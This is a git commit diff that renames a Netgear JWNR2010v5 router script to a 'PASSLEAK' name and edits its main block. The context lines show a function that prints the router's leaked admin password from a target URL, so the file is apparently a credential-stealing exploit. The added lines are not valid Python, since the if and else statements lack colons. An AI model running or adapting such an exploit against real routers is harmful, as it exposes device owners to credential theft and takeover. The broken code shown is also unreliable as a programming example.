c8ddc199b21d474d63d5f759af3a5edaa884039b
東 <36947254+D0neMkj@users.noreply.github.com>
2018-03-27 14:02:30 +0800

    Update and rename JWNR2010V5.py to JWNR2010V5_PASSLEAK.py

--- ROUTER/NETGEAR/JWNR2010V5_PASSLEAK.py
+++ ROUTER/NETGEAR/JWNR2010V5_PASSLEAK.py
@@ -12,4 +12,7 @@ def showpass(url):
 	print 'admin:'+index[1][8:-1]
 
 if __name__ == "__main__":
-	showpass(sys.argv[1])
+	if(sys.argv[1])
+		showpass(sys.argv[1])
+	else
+		print 'please add command param'
